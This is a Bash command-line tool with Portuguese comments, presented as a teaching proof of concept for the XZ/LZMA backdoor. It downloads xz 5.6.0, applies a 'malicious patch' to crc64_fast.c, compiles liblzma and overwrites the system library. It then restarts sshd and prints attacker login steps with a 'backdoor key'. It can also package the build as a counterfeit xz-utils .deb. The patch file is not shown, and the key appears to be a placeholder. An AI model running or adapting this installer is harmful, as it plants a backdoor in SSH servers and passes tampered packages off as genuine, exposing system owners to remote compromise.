#!/usr/bin/env bash
# XZ/LZMA backdoor installer – proof-of-concept CLI
# Autor: Gabryel-lima (versão didática)

set -euo pipefail

########################################
# CONFIGURAÇÕES GLOBAIS
########################################
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKDIR="${TMPDIR:-/tmp}/.xzcache"
XZ_URL="https://web.archive.org/web/20240226100419id_/https://github.com/tukaani-project/xz/releases/download/v5.6.0/xz-5.6.0.tar.gz"
BACKDOOR_PATCH_URL="local"
PATCH_NAME="crc64_fast.patch"
LIBLZMA_SO="liblzma.so.5.6.0"
LIBLZMA_A="liblzma.a"
STAGING="/usr/local/xzdoor"   # prefixo de instalação segura antes do overwrite

########################################
# CORES (sem -e para manter POSIX)
########################################
RED='\033[0;31m';   GREEN='\033[0;32m'
YELLOW='\033[0;33m'; BLUE='\033[0;34m'
NC='\033[0m'        # no color

########################################
# FUNÇÕES AUXILIARES
########################################
msg()  { printf "${BLUE}[INFO]${NC} %s\n" "$*"; }
ok()   { printf "${GREEN}[OK]${NC} %s\n"  "$*"; }
warn(){ printf "${YELLOW}[WARN]${NC} %s\n" "$*"; }
die()  { printf "${RED}[ERRO]${NC} %s\n" "$*" >&2; exit 1; }

check_root(){ [[ $EUID -eq 0 ]] || die "Execute como root (ou use sudo) para instalação."; }

install_deps(){
  msg "Verificando dependências..."
  if command -v apt-get >/dev/null 2>&1; then
    apt-get update -qq
    apt-get install -y build-essential autoconf libtool gcc make wget xz-utils checkinstall libsystemd-dev openssh-server patch
  elif command -v dnf >/dev/null 2>&1; then
    dnf groupinstall -y "Development Tools"
    dnf install -y systemd-devel xz wget openssh-server patch libtool autoconf
  elif command -v zypper >/dev/null 2>&1; then
    zypper refresh
    zypper install -y gcc make autoconf libtool wget xz checkinstall systemd-devel openssh-server patch
  fi
}

menu_banner(){
  clear
  printf "\n${RED}┌────────────────────────────────────────────┐"
  printf "\n│     XZ/LZMA backdoor creator - CLI         │"
  printf "\n│     github.com/Gabryel-lima/xzdoor-poc     │"
  printf "\n└────────────────────────────────────────────┘${NC}\n\n"
}

menu_principal(){
  menu_banner
  echo " 1) Baixar e extr tarball oficial XZ"
  echo " 2) Aplicar patch malicioso em crc64_fast.c"
  echo " 3) Compilar bibliotecas (estática + compartilhada)"
  echo " 4) Instalar sobrescrevendo liblzma do sistema"
  echo " 5) Reiniciar SSH e verificar backdoor"
  echo " 6) Verificação técnica (LDD + Journal)"
  echo " 7) Gerar arquivo .deb falso (opcional)"
  echo " 8) Sair"
  printf "\nEscolha: "; read -r opt
  case $opt in
    1) f_download;;
    2) f_patch;;
    3) f_compile;;
    4) f_install;;
    5) f_restart_ssh;;
    6) f_verify;;
    7) f_deb_fake;;
    8) exit 0;;
    *) warn "Opção inválida"; sleep 1; menu_principal;;
  esac
}

# ------------ 1) download ------------
f_download(){
  check_root
  install_deps
  msg "Criando diretório de trabalho: $WORKDIR"
  mkdir -p "$WORKDIR"
  cd "$WORKDIR"
  if [[ -f xz-5.6.0.tar.gz ]]; then
     warn "Tarball já existe, pulando download."
  else
    printf "${YELLOW}Confirma download de $XZ_URL ? (s/N):${NC} "; read -r conf
    [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }
    wget --show-progress "$XZ_URL" || die "Falha no download"
  fi
  msg "Extraindo..."
  tar -xzf xz-5.6.0.tar.gz
  ok "Extração concluída. Entre em $WORKDIR/xz-5.6.0 para ver arquivos."
  sleep 2
  menu_principal
}

# ------------ 2) aplicar patch ------------
f_patch(){
  cd "$WORKDIR/xz-5.6.0" 2>/dev/null || die "Execute primeiro a opção 1"
  local target="src/liblzma/check/crc64_fast.c"
  [[ -f $target ]] || die "$target não encontrado"

  printf "${YELLOW}Confirma aplicação do patch malicioso? (s/N):${NC} "; read -r conf
  [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }

  # usa patch local ou busca se não existir
  if [[ "$BACKDOOR_PATCH_URL" == "local" ]]; then
     msg "Usando patch local..."
     [[ -f ../$PATCH_NAME ]] || cp -v "$SCRIPT_DIR/$PATCH_NAME" ../$PATCH_NAME
  else
     [[ -f ../$PATCH_NAME ]] || wget -q "$BACKDOOR_PATCH_URL" -O ../$PATCH_NAME
  fi
  patch -p1 < ../$PATCH_NAME || die "Patch falhou"
  ok "Arquivo src/liblzma/check/crc64_fast.c alterado."
  grep -n "_get_cpuid\|_decode_fixup" "$target" || true
  sleep 3
  menu_principal
}

# ------------ 3) compilar ------------
f_compile(){
  cd "$WORKDIR/xz-5.6.0"
  printf "${YELLOW}Compilar com suporte a shared e static? (s/N):${NC} "; read -r conf
  [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }

  ./configure --enable-static --enable-shared --prefix="$STAGING"
  make -j"$(nproc)"
  ok "Compilação finalizada. Bibliotecas em src/liblzma/.libs/"
  ls -lh src/liblzma/.libs/liblzma.*
  sleep 3
  menu_principal
}

# ------------ 4) sobrescrever liblzma do sistema ------------
f_install(){
  check_root
  cd "$WORKDIR/xz-5.6.0"
  local src_so="src/liblzma/.libs/liblzma.so.5.6.0"
  local src_a="src/liblzma/.libs/liblzma.a"
  [[ -f $src_so && -f $src_a ]] || die "Compile primeiro (opção 3)"

  printf "${YELLOW}SOBRESCREVER liblzama do sistema (IRREVERSÍVEL)? (s/N):${NC} "; read -r conf
  [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }

  # descobre arquitetura
  local libdir
  case "$(uname -m)" in
    x86_64) libdir="/usr/lib/x86_64-linux-gnu" ;;  # Debian/Ubuntu
    *)       libdir="/usr/lib" ;;
  esac
  cp -v "$src_so" "$libdir/$LIBLZMA_SO"
  cp -v "$src_a"  "$libdir/$LIBLZMA_A"
  ldconfig
  ok "Bibliotecas substituídas. sshd recarregará ao reiniciar."
  sleep 2
  menu_principal
}

# ------------ 5) restart ssh e valida ------------
f_restart_ssh(){
  check_root
  printf "${YELLOW}Reiniciar SSH agora? (s/N):${NC} "; read -r conf
  [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }

  local ssh_svc="ssh"
  systemctl list-unit-files | grep -q "^sshd.service" && ssh_svc="sshd"

  msg "Reiniciando serviço: $ssh_svc"
  systemctl enable "$ssh_svc" || true
  systemctl restart "$ssh_svc" || die "Falha ao restartar $ssh_svc"
  ok "SSH ($ssh_svc) reiniciado e habilitado."
  
  echo -e "\n${BLUE}================ INSTRUÇÕES DE TESTE ==================${NC}"
  echo "1. No seu host (atacante), execute:"
  echo -e "   ${YELLOW}ssh -o \"PubkeyAuthentication=yes\" usuario@$(hostname -I | awk '{print $1}') ${NC}"
  echo -e "\n2. Use a chave mágica (payload):"
  echo "-----BEGIN OPENSSH BACKDOOR KEY-----"
  echo "AAAAE2VjZS5waHA6Ly8vanVzdC1hLXRlc3QtY2Fsb"
  echo "-----END OPENSSH BACKDOOR KEY-----"
  echo -e "${BLUE}=======================================================${NC}\n"
  
  sleep 5
  menu_principal
}

# ------------ 6) verificação técnica ------------
f_verify(){
  msg "Verificando dependência da liblzma no sshd..."
  local sshd_path
  sshd_path=$(command -v sshd || echo "/usr/sbin/sshd")
  
  if [[ -f "$sshd_path" ]]; then
    ldd "$sshd_path" | grep liblzma || warn "liblzma não encontrada no sshd"
  else
    warn "Binário sshd não encontrado para verificação LDD"
  fi

  msg "Logs recentes do SSH (últimas 10 linhas):"
  local ssh_svc="ssh"
  systemctl list-unit-files | grep -q "^sshd.service" && ssh_svc="sshd"
  journalctl -u "$ssh_svc" -n 10 --no-pager || true
  
  printf "\n${YELLOW}Pressione ENTER para voltar ao menu...${NC}"; read -r
  menu_principal
}

# ------------ 6) empacotar .deb falso ------------
f_deb_fake(){
  check_root
  cd "$WORKDIR/xz-5.6.0"
  command -v checkinstall >/dev/null || die "Instale checkinstall primeiro"
  printf "${YELLOW}Gerar pacote .deb com nome xz-utils (5.6.0-1) ? (s/N):${NC} "; read -r conf
  [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }

  checkinstall -D -y --pkgname=xz-utils --pkgversion=5.6.0 --backup=no \
               --deldoc=yes --deldesc=yes --fstrans=no \
               make install
  ok "Pacote .deb criado em /usr/src/xz-utils_5.6.0-1_amd64.deb"
  echo "Instale com: sudo dpkg -i xz-utils_5.6.0-1_amd64.deb"
  sleep 3
  menu_principal
}

# ===================  ENTRYPOINT  ===================
#[[ "${1:-}" == "--cli" ]] && menu_principal
# Se quiser execução direta sem menu, chame funções explicitamente
check_root
menu_principal
